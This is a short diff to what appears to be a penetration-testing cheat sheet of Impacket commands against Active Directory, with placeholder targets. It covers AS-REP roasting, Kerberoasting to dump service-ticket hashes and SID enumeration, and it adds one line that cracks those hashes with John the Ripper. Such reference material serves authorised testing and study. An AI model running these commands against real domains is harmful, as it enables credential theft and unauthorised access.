@@ -48,6 +48,7 @@ GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat
 GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -request
 GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -request-user svc-account
 GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -outputfile hashes.txt
+john --format=krb5tgs tgs_hashes.txt --wordlist=/path/to/wordlist.txt
 
 # lookupsid.py
 lookupsid.py anonymous@10.10.10.10
